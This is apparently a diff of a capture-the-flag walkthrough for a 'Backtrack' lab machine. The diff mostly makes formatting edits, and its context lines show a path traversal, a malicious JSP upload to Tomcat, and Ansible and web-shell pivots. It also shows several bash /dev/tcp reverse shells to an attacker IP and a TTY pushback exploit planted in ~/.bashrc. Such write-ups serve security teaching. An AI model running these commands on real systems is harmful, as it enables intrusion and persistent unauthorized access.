@@ -85,12 +85,10 @@ Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
 ```
 
 - Rustscan results
+
 ```bash
 └─$ rustscan -a 10.10.63.114 --ulimit 5000
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+
 The Modern Day Port Scanner.
 ________________________________________
 : http://discord.skerritt.blog         :
@@ -109,6 +107,7 @@ PORT     STATE SERVICE        REASON
 ```
 
 - Massscan report
+
 ```bash
 └─# masscan 10.10.63.114 -p1-65535,U:1-65535 --rate=1000 -e tun0 | tee massscan.port
 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-02 12:52:35 GMT
@@ -204,6 +203,7 @@ tomcat:x:1002:1002::/opt/tomcat:/bin/false
 ```
 
 - Checking server Environment variables since we can not access apache server logs files
+
 ``` bash
 ➜  backtrack curl --path-as-is http://10.10.63.114:8888/../../../../../../../../../../../../../../../../../../../../proc/self/environ --output env.txt
 
@@ -231,6 +231,7 @@ LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOM
 
 </tomcat-users>
 ```
+
 - since our roles are limited to `roles="manager-script"/`, we can only exploiting malicious jsp upload vulnerability in apache tomcat via `curl`.
 
 - Payload generation with `msfvenom`
@@ -274,6 +275,7 @@ tomcat@Backtrack:~$
 #### User Privilege  escalation - Pivoting attack
 
 - Checking curret Privilege  of user with `sudo -l`
+
 ```bash
 tomcat@Backtrack:~$ ls -la /home/
 total 16
@@ -304,6 +306,7 @@ bash -c 'exec bash -i &>/dev/tcp/10.21.123.111/4445 <&1'
 ```
 
 - Shell as user wilbur
+
 ```bash
 tomcat@Backtrack:/tmp$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/a.yml
 
@@ -317,12 +320,15 @@ ok: [localhost]
 
 TASK [RShell] ******************************************************************
 ```
+
 <figure>
 <img src="/assets/img/backtrack/user-wilbur.png" alt="wilbur user shell">
 <figcaption>wilbur user shell</figcaption>
 </figure>
 
+
 - User profile with usable files
+
 ```bash
 wilbur@Backtrack:/tmp$ cd ~    
 wilbur@Backtrack:~$ ls -la
@@ -357,6 +363,7 @@ wilbur@Backtrack:~$
 </figure>
 
 - SSH port Forwading so that local port in target can be accessible to our machine.
+
 ```bash
 └─$ ssh -L 80:127.0.0.1:80 wilbur@10.10.63.114
 The authenticity of host '10.10.63.114 (10.10.63.114)' can't be established.
@@ -373,7 +380,7 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-173-generic x86_64)
 wilbur@Backtrack:~$ 
 ```
 
-- Accessing web app via `http://127.0.0.1:80/`
+- Accessing web app via [http://127.0.0.1:80/](http://127.0.0.1:80/)
 
 <figure>
 <img src="/assets/img/backtrack/port-80.png" alt="port 80">
@@ -387,13 +394,14 @@ wilbur@Backtrack:~$
 <figcaption>port 80 shell upload</figcaption>
 </figure>
 
-
 - Shell as user olivile
 
 ```bash
 curl http://127.0.0.1:80/file.jpg.php?cmd="bash -c 'exec bash -i &>/dev/tcp/10.21.123.111/4445 <&1'"
 ```
+
 - listen on port 
+
 ```bash
 └─# nc -nlvp 4445                                                                                                     
 listening on [any] 4445 ...
@@ -422,6 +430,7 @@ orville@Backtrack:/home/orville$
 ```
 
 #### Root Privilege  escalation
+
 - Uploaded linpease in the target machine to check any missconfigurations no luck.
 - Using process spy tool `pspy64`
 
@@ -441,7 +450,8 @@ When root switched to Orville using this commnad `su — orville`, it created a 
 [TTY pushback attack - more understanding](https://www.errno.fr/TTYPushback.html).
 
 - Creating exploit python script
-```bash
+
+```console
 # eploit.py
 #!/usr/bin/env python3
 import fcntl
@@ -457,6 +467,7 @@ for char in sys.argv[1] + '\n':
 ```
 
 - Then 
+
 ```bash
 echo "python3 /tmp/eploit.py \"bash -c 'bash -i >& /dev/tcp/10.21.123.111/4446 0>&1'\"" >> ~/.bashrc
 ```
